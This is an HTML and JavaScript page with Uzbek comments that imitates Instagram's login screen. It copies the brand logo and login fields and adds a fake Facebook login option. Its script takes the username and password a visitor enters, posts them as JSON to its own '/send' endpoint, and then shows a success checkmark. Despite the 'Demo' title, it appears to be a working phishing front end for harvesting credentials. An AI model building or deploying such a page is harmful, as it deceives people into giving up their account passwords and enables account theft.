
<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login Demo</title>

<!-- Font Awesome for icons -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<link rel="stylesheet" href="style.css">

<style>
/* ===== Extra Styles for Responsive Checkmark & Status ===== */
.insta-logo img, .success-logo img {
    width: 100px; /* bir xil o'lcham */
    height: 100px;
    display: block;
    margin: 0 auto 20px auto;
    transition: transform 0.6s ease, opacity 0.6s ease;
}

.success-logo {
    display: none;
    text-align: center;
}

/* aylanish animatsiyasi */
@keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}

/* Mobile adjustments */
@media (max-width: 400px) {
    .insta-logo img, .success-logo img {
        width: 60px;
        height: 60px;
    }

    input, button {
        padding: 10px 8px;
        font-size: 14px;
    }

    .status {
        font-size: 13px;
    }
}
</style>

</head>
<body>

<div class="container">
    <div class="login-box">
        <!-- Instagram logo -->
        <div class="insta-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo" id="insta-img">
        </div>

        <!-- Success checkmark icon -->
        <div class="success-logo">
            <img src="https://cdn3d.iconscout.com/3d/premium/thumb/galochka-3d-icon-png-download-11169918.png" alt="Verified" id="checkmark-img">
        </div>

        <form id="form">
            <input type="text" id="username" placeholder="Mobile number,username or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>

        <div class="divider">OR</div>
        <div class="fb-login"><i class="fa-brands fa-facebook-square"></i> Log in with Facebook</div>
        <p class="status" id="status"></p>
    </div>

    <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
    </div>
</div>

<script>
const form = document.getElementById("form");
const status = document.getElementById("status");
const instaLogo = document.querySelector(".insta-logo");
const successLogo = document.querySelector(".success-logo");
const instaImg = document.getElementById("insta-img");
const checkImg = document.getElementById("checkmark-img");

form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Instagram logoni aylantirish
    instaImg.style.animation = "spin 1s linear infinite";

    try {
        const response = await fetch("/send", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password })
        });

        if(response.ok){
            // 1 sekunddan keyin Instagram logosi galochka bilan almashtirilsin
            setTimeout(() => {
                instaLogo.style.display = "none";
                instaImg.style.animation = ""; // animatsiyani to‘xtatish
                successLogo.style.display = "block";

                checkImg.style.transform = "scale(1.2)";
                setTimeout(() => { checkImg.style.transform = "scale(1)"; }, 300);

                form.reset();
            }, 1000);
        } else {
            status.style.color = "red";
            status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
            instaImg.style.animation = "";
        }
    } catch(err){
        console.error(err);
        status.style.color = "red";
        status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
        instaImg.style.animation = "";
    }
});
</script>

</body>
</html>
